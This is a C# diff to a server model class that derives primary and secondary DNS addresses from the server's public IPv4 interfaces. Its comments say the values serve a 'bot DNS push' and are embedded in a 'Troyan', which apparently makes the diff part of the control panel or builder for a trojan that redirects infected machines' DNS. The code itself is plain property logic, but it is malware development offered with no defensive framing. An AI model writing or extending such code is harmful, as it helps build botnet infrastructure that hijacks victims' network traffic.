@@ -32,6 +32,10 @@ public class ServerModel : BaseModel
     [JsonIgnore]
     public IReadOnlyList<string> InterfaceIpv4Addresses => ServerNetworkRefinement.GetInterfaceIpv4Addresses();
 
+    /// <summary>Public IPv4 addresses from up interfaces (discovery order).</summary>
+    [JsonIgnore]
+    public IReadOnlyList<string> PublicIpv4Addresses => ServerNetworkRefinement.GetPublicOrderedIpv4Strings();
+
     [JsonPropertyName("server")]
     public string Server
     {
@@ -69,9 +73,13 @@ public class ServerModel : BaseModel
 
     [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }
 
-    [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; } = "";
+    /// <summary>First public IPv4 for bot DNS push; evaluated live, serialized on save for Troyan embed.</summary>
+    [JsonPropertyName("primaryDns")]
+    public string PrimaryDns => ServerNetworkRefinement.GetPrimaryDns();
 
-    [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; } = "";
+    /// <summary>Second public IPv4 (or primary when only one); evaluated live, serialized on save for Troyan embed.</summary>
+    [JsonPropertyName("secondaryDns")]
+    public string SecondaryDns => ServerNetworkRefinement.GetSecondaryDns();
 
 
 
